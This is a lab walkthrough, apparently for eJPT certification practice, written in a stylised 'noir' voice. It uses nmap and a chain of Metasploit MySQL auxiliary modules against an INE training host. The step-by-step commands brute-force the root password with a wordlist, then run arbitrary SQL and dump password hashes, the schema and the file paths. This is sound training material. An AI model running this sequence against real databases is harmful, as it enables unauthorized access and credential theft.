# Red Team: Noir Edition  
## MySQL Enumeration via Metasploit – Operation: Phantom Schema  
### eJPT Prep Project

> _"The database whispered secrets. I made it scream."_  
> — **NoirSpecter**

---

## Target  
**Hostname:** `demo.ine.local`  
**Tools Used:**  
- Kali Linux (GUI)  
- Nmap  
- Metasploit Framework

---

## Objective  
Run a series of Metasploit **MySQL auxiliary modules** against the target to perform recon, credential discovery, and data extraction. No payloads—just **pure information warfare**.

---

## 📡 Phase 1: Initial Recon

### 🔍 Check Target Availability

ping -c 4 demo.ine.local
✅ Host is reachable.

🔍 Nmap Scan
nmap demo.ine.local
✅ Port 3306 open — MySQL service detected.


🧰 Phase 2: Metasploit Module Execution

1. 🧬 MySQL Version Fingerprint
use auxiliary/scanner/mysql/mysql_version
set RHOSTS demo.ine.local
run
✅ MySQL version confirmed.


2. 🔓 MySQL Login Bruteforce
use auxiliary/scanner/mysql/mysql_login
set RHOSTS demo.ine.local
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
✅ Credentials discovered:
root : twinkle


3. 🧠 MySQL Enumeration
use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
📖 Extracted:
	•	User accounts
	•	Version info
	•	Privileges
	•	Hostnames


4. 🖥️ SQL Execution via Authenticated Session
use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
🧨 Arbitrary SQL execution successful.


5. 📁 File Enumeration
use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run
🗂️ Visible filesystem paths discovered.


6. 🔐 Hash Dump
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
🔑 Password hashes retrieved.


7. 🧱 Schema Dump
use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS demo.ine.local
run
📚 Database schema successfully dumped.


8. ✍️ Writable Directory Scan
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
⚠️ Writable directories identified. Post-exploitation entry points confirmed.

✅ Conclusion

The target (demo.ine.local) exposed a poorly secured MySQL instance, allowing full enumeration and data exfiltration via Metasploit’s auxiliary modules. No exploitation or shell required—just careful, methodical red team reconnaissance.

“The system didn’t scream. It whispered everything I needed to know.”
— NoirSpecter
